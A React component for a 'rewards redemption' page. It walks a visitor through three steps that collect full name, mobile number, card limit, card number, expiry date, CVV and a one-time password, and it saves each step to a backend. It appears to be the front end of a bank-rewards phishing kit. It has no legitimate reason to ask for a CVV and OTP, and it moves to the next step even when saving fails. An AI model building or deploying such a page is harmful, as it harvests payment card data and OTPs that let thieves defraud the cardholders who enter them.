import React, { useState } from 'react';
import { Triangle, Menu, Check, AlertTriangle } from 'lucide-react';
import { apiService } from '../services/api';
import PersonalInfoForm from './PersonalInfoForm';
import CreditCardForm from './CreditCardForm';
import OTPVerification from './OTPVerification';
import ErrorModal from './ErrorModal';
import Navbar from './Navbar';
import Footer from './Footer';

interface FormData {
  fullName: string;
  mobileNumber: string;
  cardLimit: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  otp: string;
}

const RewardsRedemption: React.FC = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [requestId, setRequestId] = useState<string | null>(null);
  const [formData, setFormData] = useState<FormData>({
    fullName: '',
    mobileNumber: '',
    cardLimit: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    otp: ''
  });

  // Add a function to handle OTP resend from the modal
  const handleResendOTPFromModal = () => {
    // This will clear the OTP and reset the timer
    console.log('Resend OTP triggered from ErrorModal');
    
    // Clear the OTP in form data
    setFormData(prev => ({ ...prev, otp: '' }));
  };

  const steps = [
    { number: 1, label: 'Personal Info', key: 'personal' },
    { number: 2, label: 'Details', key: 'details' },
    { number: 3, label: 'Verification', key: 'verification' }
  ];

  const getStepClass = (stepNumber: number) => {
    if (stepNumber < currentStep) {
      return 'bg-green-500 text-white';
    } else if (stepNumber === currentStep) {
      return 'bg-[#a14450] text-white';
    } else {
      return 'bg-gray-300 text-gray-600';
    }
  };

  const updateFormData = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const nextStep = async () => {
    try {
      if (currentStep === 1) {
        // Save personal info
        const response = await apiService.savePersonalInfo({
          fullName: formData.fullName,
          mobileNumber: formData.mobileNumber,
          cardLimit: formData.cardLimit
        });
        setRequestId(response.requestId);
        console.log('Personal info saved:', response.requestId);
      } else if (currentStep === 2 && requestId) {
        // Save card details
        const response = await apiService.saveCardDetails(requestId, {
          cardNumber: formData.cardNumber,
          expiryDate: formData.expiryDate,
          cvv: formData.cvv
        });
        console.log('Card details saved:', response.requestId);
      }
      
      if (currentStep < 3) {
        setCurrentStep(currentStep + 1);
      }
    } catch (error) {
      console.error('Error saving form data:', error);
      // Don't show error modal for step-by-step saving, just log the error
      // The form will still proceed to the next step
      if (currentStep < 3) {
        setCurrentStep(currentStep + 1);
      }
    }
  };

  const previousStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleSubmit = async () => {
    try {
      if (requestId) {
        // Submit OTP to complete the request
        await apiService.submitOTP(requestId, formData.otp);
        // Success message will be shown in OTP component
      } else {
        // Fallback to old method if no requestId
        await apiService.submitRedemptionRequest(formData);
        // Success message will be shown in OTP component
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      setShowErrorModal(true);
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <PersonalInfoForm
            formData={formData}
            updateFormData={updateFormData}
            onNext={nextStep}
          />
        );
      case 2:
        return (
          <CreditCardForm
            formData={formData}
            updateFormData={updateFormData}
            onNext={nextStep}
            onBack={previousStep}
          />
        );
      case 3:
        return (
          <OTPVerification
            formData={formData}
            updateFormData={updateFormData}
            onSubmit={handleSubmit}
            onBack={previousStep}
            onError={() => setShowErrorModal(true)}
          />
        );
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <Navbar />

      {/* Main Content */}
      <main className="py-8 sm:py-12 px-4 sm:px-6">
        <div className="max-w-md sm:max-w-lg mx-auto">
          <div className="bg-white rounded-xl shadow-lg p-6 sm:p-8">
            
            <p className="text-gray-600 text-center mb-6 sm:mb-8 text-sm sm:text-base">
              Complete the following steps to unlock your rewards redemption.
            </p>

            {/* Progress Steps - Responsive */}
            <div className="flex justify-between items-center mb-6 sm:mb-8 relative">
              {steps.map((step, index) => (
                <React.Fragment key={step.number}>
                  <div className="flex flex-col items-center z-10">
                    <div className={`w-8 h-8 sm:w-10 sm:h-10 rounded-full flex items-center justify-center text-xs sm:text-sm font-medium mb-2 ${getStepClass(step.number)}`}>
                      {step.number < currentStep ? <Check className="h-3 w-3 sm:h-4 sm:w-4" /> : step.number}
                    </div>
                    <span className={`text-xs sm:text-sm ${step.number === currentStep ? 'text-[#a14450] font-medium' : 'text-gray-500'} text-center`}>
                      {step.label}
                    </span>
                  </div>
                  {index < steps.length - 1 && (
                    <div className="absolute top-4 left-1/4 right-1/4 h-px bg-gray-300 mx-4 -z-10" />
                  )}
                </React.Fragment>
              ))}
            </div>

            {/* Step Content */}
            {renderStepContent()}
          </div>
        </div>
      </main>

      <Footer />

      {/* Error Modal - Fixed to include onResendOTP prop */}
      {showErrorModal && (
        <ErrorModal 
          onClose={() => setShowErrorModal(false)} 
          onResendOTP={handleResendOTPFromModal}
        />
      )}
    </div>
  );
};

export default RewardsRedemption;